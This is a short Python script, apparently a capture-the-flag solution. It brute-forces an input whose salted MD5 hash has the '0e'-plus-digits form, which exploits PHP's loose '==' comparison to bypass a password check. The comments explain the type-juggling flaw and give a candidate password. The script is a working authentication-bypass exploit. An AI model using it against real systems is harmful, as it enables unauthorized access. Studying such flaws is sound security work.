import string
import hashlib
import itertools

# NOTE: Because of PHP's type juggling, it thinks that the hash
#       provided '0e902564435691274142490923013038' is a scientific
#       notation that results in '0'. Since the password hash is checked
#       with the loose equal operator '==' instead of '===', we just have
#       to make sure that our resulting hash starts with '0e' as well, and
#       every following character will be a number. This will make it also
#       result in '0'.
# NOTE: Possible password: az038r

def md5_zero_gen(prefix_salt, chars):
    word_len = 1
    while True:
        for i in itertools.permutations(chars, word_len):
            word = "".join(i)
            text = prefix_salt + word
            hash = hashlib.md5(text.encode()).hexdigest()
            if hash[:2] == "0e" and hash[2:].isdecimal():
                return word
        word_len += 1

chars = string.ascii_lowercase + "0123456789"
hash = "0e902564435691274142490923013038"
salt = "f789bbc328a3d1a3"

print(f"Generating an MD5 with prefix salt '{salt}' that evaluates to '0' as a scientific notation...")
passwd = md5_zero_gen(salt, chars)
print(f"Valid password: {passwd}")
